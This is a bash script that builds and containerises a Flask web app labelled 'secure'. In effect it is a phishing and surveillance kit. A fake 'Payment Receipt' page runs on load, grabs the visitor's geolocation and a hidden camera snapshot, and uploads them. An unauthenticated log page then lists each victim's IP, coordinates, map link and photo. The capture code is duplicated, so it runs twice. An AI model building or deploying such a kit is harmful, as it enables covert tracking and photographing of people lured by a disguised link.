#!/bin/bash
set -e

echo "[+] Setting up secure Flask app with auto-triggered geolocation and camera..."

mkdir -p secure-flask-app/{templates,static,uploads/photos,ssl}
cd secure-flask-app

echo "[+] Generating SSL certificate..."
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout ssl/server.key -out ssl/server.crt \
  -subj "/C=US/ST=Dubai/L=India/O=SMS/CN=behappy"

echo "[+] Downloading sample PDF..."
curl -L -o static/payment_receipt.pdf \
  https://www.bankunited.com/docs/default-source/resource-corner/smishing-and-phishing-explained.pdf

cat > templates/index.html <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Secure Download</title></head>
<body style="font-family:sans-serif;text-align:center;padding:40px;">
  <h1>Payment Receipt</h1>
  <p>Your location and photo will be captured automatically for verification purposes.</p>
  <a href="/static/payment_receipt.pdf" download>
    <button style="font-size:18px;padding:10px 20px;">Download Payment Receipt</button>
  </a>
  <div id="status" style="margin-top:20px;color:gray;"></div>
  <script>
    function updateStatus(msg) {
      document.getElementById("status").textContent = msg;
    }

    async function autoUpload() {
  let latitude = null;
  let longitude = null;
  let photoBlob = null;

  try {
    updateStatus("Requesting geolocation...");
    const geo = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    latitude = geo.coords.latitude;
    longitude = geo.coords.longitude;
  } catch (err) {
    updateStatus("Geolocation failed: " + err.message);
  }

  try {
    updateStatus("Requesting camera access...");
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.style.display = "none";
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => setTimeout(resolve, 1500));

    const canvas = document.createElement("canvas");
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

    stream.getTracks().forEach(track => track.stop());
    video.remove();
  } catch (err) {
    updateStatus("Camera error: " + err.message);
  }

  try {
    const formData = new FormData();
    if (photoBlob) {
      formData.append("photo", photoBlob, "snapshot.jpg");
    }
    if (latitude && longitude) {
      formData.append("latitude", latitude);
      formData.append("longitude", longitude);
    }

    const res = await fetch("/upload-evidence", {
      method: "POST",
      body: formData
    });

    updateStatus(res.ok ? "Data uploaded." : "Upload failed.");
  } catch (err) {
    updateStatus("Upload error: " + err.message);
  }
      try {
        updateStatus("Requesting geolocation...");
        const geo = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        });

        updateStatus("Requesting camera access...");
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.style.display = "none";
        document.body.appendChild(video);
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("photo", blob, "snapshot.jpg");
            formData.append("latitude", geo.coords.latitude);
            formData.append("longitude", geo.coords.longitude);
            fetch("/upload-evidence", {
              method: "POST",
              body: formData
            }).then(() => updateStatus("Evidence uploaded."))
              .catch(err => updateStatus("Upload failed: " + err.message));
          }, "image/jpeg");
          stream.getTracks().forEach(track => track.stop());
          video.remove();
        }, 1500);
      } catch (err) {
        updateStatus("Error: " + err.message);
      }
    }

    window.addEventListener('load', () => {
      setTimeout(() => autoUpload(), 1000);
    });
  </script>
</body>
</html>
EOF

cat > app.py <<'EOF'
from flask import Flask, request, send_from_directory, render_template, jsonify
import os, sqlite3, datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
DB_FILE = 'logs.db'
os.makedirs(os.path.join(UPLOAD_FOLDER, 'photos'), exist_ok=True)

with sqlite3.connect(DB_FILE) as conn:
    conn.execute('''CREATE TABLE IF NOT EXISTS access_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        filename TEXT, ip TEXT, lat REAL, lon REAL, timestamp TEXT, photo TEXT)''')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload-evidence', methods=['POST'])
def upload_evidence():
    photo = request.files['photo']
    lat = request.form.get('latitude')
    lon = request.form.get('longitude')
    ip = request.remote_addr
    timestamp = datetime.datetime.utcnow().isoformat()
    filename = f"photo_{ip.replace('.', '_')}_{datetime.datetime.utcnow().strftime('%Y%m%d%H%M%S')}.jpg"
    photo.save(os.path.join(UPLOAD_FOLDER, 'photos', filename))
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("""INSERT INTO access_log (filename, ip, lat, lon, timestamp, photo)
                          VALUES (?, ?, ?, ?, ?, ?)""", 
                     ("smishing-and-phishing-explained.pdf", ip, lat, lon, timestamp, filename))
    return "Success"

@app.route('/uploads/photos/<filename>')
def photo(filename):
    return send_from_directory(os.path.join(UPLOAD_FOLDER, 'photos'), filename)

@app.route('/static/<filename>')
def static_file(filename):
    return send_from_directory('static', filename)

@app.route('/list-access')
def list_access():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.execute("SELECT id, filename, ip, lat, lon, timestamp, photo FROM access_log ORDER BY timestamp DESC")
        data = [dict(id=row[0], filename=row[1], ip=row[2], lat=row[3], lon=row[4], timestamp=row[5], photo=row[6]) for row in cursor.fetchall()]
    return jsonify(data)

@app.route('/geo.html')
def geo():
    return render_template('geo.html')
EOF

cat > templates/geo.html <<'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Access Log with Geolocation and Photos</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ccc; padding: 10px; text-align: center; }
    img.thumb { width: 120px; border: 1px solid #ccc; }
    a.map-link { font-size: 0.9em; color: blue; text-decoration: underline; }
  </style>
</head>
<body>
  <h2>Access Log</h2>
  <table id="logTable">
    <thead>
      <tr>
        <th>ID</th><th>IP</th><th>Latitude</th><th>Longitude</th><th>Time</th><th>Map</th><th>Photo</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>
  <script>
    async function loadLogs() {
      const res = await fetch('/list-access');
      const data = await res.json();
      const tbody = document.querySelector("#logTable tbody");
      tbody.innerHTML = '';
      data.forEach(log => {
        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td>${log.id}</td>
          <td>${log.ip}</td>
          <td>${log.lat}</td>
          <td>${log.lon}</td>
          <td>${log.timestamp}</td>
          <td>${log.lat && log.lon ? `<a href='https://www.google.com/maps?q=${log.lat},${log.lon}' target='_blank' class='map-link'>Map</a>` : 'N/A'}</td>
          <td>${log.photo ? `<img src='/uploads/photos/${log.photo}' class='thumb'>` : 'Not captured'}</td>
        `;
        tbody.appendChild(tr);
      });
    }
    loadLogs();
  </script>
</body>
</html>
EOF

cat > Dockerfile <<'EOF'
FROM python:3.10-slim
WORKDIR /app
COPY . /app
RUN pip install flask
EXPOSE 5000
CMD ["python", "app.py"]
EOF

cat > docker-compose.yml <<'EOF'
version: '3'
services:
  webapp:
    build: .
    ports:
      - "443:5000"
    volumes:
      - ./uploads:/app/uploads
      - ./ssl:/app/ssl
EOF

echo "[✓] Setup complete in secure-flask-app/"
echo "To run: cd secure-flask-app && docker-compose up --build"
